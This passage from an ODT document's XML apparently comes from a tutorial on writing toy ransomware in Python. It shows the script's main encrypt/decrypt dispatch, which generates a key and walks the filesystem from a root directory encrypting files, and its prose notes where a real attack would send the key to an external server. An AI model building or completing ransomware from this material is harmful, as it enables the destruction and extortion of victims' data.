        <table:table-columns>
          <table:table-column table:style-name="TableColumn281"/>
          <table:table-column table:style-name="TableColumn282"/>
        </table:table-columns>
        <table:table-row table:style-name="TableRow283">
          <table:table-cell table:style-name="TableCell284">
            <text:soft-page-break/>
            <text:p text:style-name="P285"><text:span text:style-name="T286">if</text:span><text:span text:style-name="T287"><text:s/>action<text:s/></text:span><text:span text:style-name="T288">==</text:span><text:span text:style-name="T289"><text:s/></text:span><text:span text:style-name="T290">'decrypt'</text:span><text:span text:style-name="T291">:</text:span></text:p>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P285"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow292">
          <table:table-cell table:style-name="TableCell293">
            <text:p text:style-name="P294"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell295">
            <text:p text:style-name="P296"><text:span text:style-name="T297"><text:s text:c="8"/></text:span><text:span text:style-name="T298">if</text:span><text:span text:style-name="T299"><text:s/>keyfile<text:s/></text:span><text:span text:style-name="T300">is</text:span><text:span text:style-name="T301"><text:s/></text:span><text:span text:style-name="T302">None</text:span><text:span text:style-name="T303">:</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow304">
          <table:table-cell table:style-name="TableCell305">
            <text:p text:style-name="P306"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell307">
            <text:p text:style-name="P308"><text:span text:style-name="T309"><text:s text:c="12"/></text:span><text:span text:style-name="T310">print</text:span><text:span text:style-name="T311">(</text:span><text:span text:style-name="T312">'Path to keyfile must be specified after --keyfile to perform decryption.'</text:span><text:span text:style-name="T313">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow314">
          <table:table-cell table:style-name="TableCell315">
            <text:p text:style-name="P316"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell317">
            <text:p text:style-name="P318"><text:span text:style-name="T319"><text:s text:c="8"/></text:span><text:span text:style-name="T320">else</text:span><text:span text:style-name="T321">:</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow322">
          <table:table-cell table:style-name="TableCell323">
            <text:p text:style-name="P324"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell325">
            <text:p text:style-name="P326"><text:s text:c="12"/>rware.read_key(keyfile)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow327">
          <table:table-cell table:style-name="TableCell328">
            <text:p text:style-name="P329"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell330">
            <text:p text:style-name="P331"><text:span text:style-name="T332"><text:s text:c="12"/>rware.crypt_root(local_root,<text:s/></text:span><text:span text:style-name="T333">encrypted</text:span><text:span text:style-name="T334">=</text:span><text:span text:style-name="T335">True</text:span><text:span text:style-name="T336">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow337">
          <table:table-cell table:style-name="TableCell338">
            <text:p text:style-name="P339"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell340">
            <text:p text:style-name="P341"><text:span text:style-name="T342"><text:s text:c="4"/></text:span><text:span text:style-name="T343">elif</text:span><text:span text:style-name="T344"><text:s/>action<text:s/></text:span><text:span text:style-name="T345">==</text:span><text:span text:style-name="T346"><text:s/></text:span><text:span text:style-name="T347">'encrypt'</text:span><text:span text:style-name="T348">:</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow349">
          <table:table-cell table:style-name="TableCell350">
            <text:p text:style-name="P351"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell352">
            <text:p text:style-name="P353"><text:s text:c="8"/>rware.generate_key()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow354">
          <table:table-cell table:style-name="TableCell355">
            <text:p text:style-name="P356"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell357">
            <text:p text:style-name="P358"><text:span text:style-name="T359"><text:s text:c="8"/>rware.write_key(</text:span><text:span text:style-name="T360">'keyfile'</text:span><text:span text:style-name="T361">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow362">
          <table:table-cell table:style-name="TableCell363">
            <text:p text:style-name="P364"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell365">
            <text:p text:style-name="P366"><text:s text:c="8"/>rware.crypt_root(local_root)</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard">If our action in the command line is decrypt, then we go ahead and we read the key file and we call that crypt root function which is<text:s/>going to go ahead and walk through all those directories starting at the root directory and then it will go ahead and encrypt all those files given that the file extension is the one that we want to encrypt,<text:s/></text:p>
      <text:p text:style-name="Standaard">then it if we say otherwise, the action is encrypt then we actually going to take this class and generate a key with it. Then we are going ahead and write that key to the key file. Again if this was real ransomware, this is where that would be posted tos ome external server where it would be held hostage for some reason and then you gould go ahead and crypt starting at the root directory again, which is going iterate through all those files, encrypt all those files and that will be it.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="P367"/>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Duidelijkcitaat" style:display-name="Duidelijk citaat" style:family="paragraph" style:parent-style-name="Standaard" style:next-style-name="Standa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DuidelijkcitaatChar" style:display-name="Duidelijk citaat Char" style:family="text" style:parent-style-name="Standaardalinea-lettertype">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic" fo:color="#4472C4"/>
    </style:style>
    <style:style style:name="pl-k" style:display-name="pl-k"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en" style:display-name="pl-en" style:family="text" style:parent-style-name="Standaardalinea-lettertype"/>
    <style:style style:name="pl-smi" style:display-name="pl-smi" style:family="text" style:parent-style-name="Standaardalinea-lettertype"/>
    <style:style style:name="pl-s" style:display-name="pl-s" style:family="text" style:parent-style-name="Standaardalinea-lettertype"/>
    <style:style style:name="pl-pds" style:display-name="pl-pds"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 Morcy</meta:initial-creator>
    <dc:creator>N. Morcy</dc:creator>
    <meta:creation-date>2019-12-15T11:18:00Z</meta:creation-date>
    <dc:date>2019-12-16T09:51:00Z</dc:date>
    <meta:template xlink:href="Normal" xlink:type="simple"/>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:editing-duration>PT81180S</meta:editing-duration>
    <meta:document-statistic meta:page-count="5" meta:paragraph-count="18" meta:word-count="1446" meta:character-count="9384" meta:row-count="66" meta:non-whitespace-character-count="7956"/>
  </office:meta>
</office:document-meta>
</file>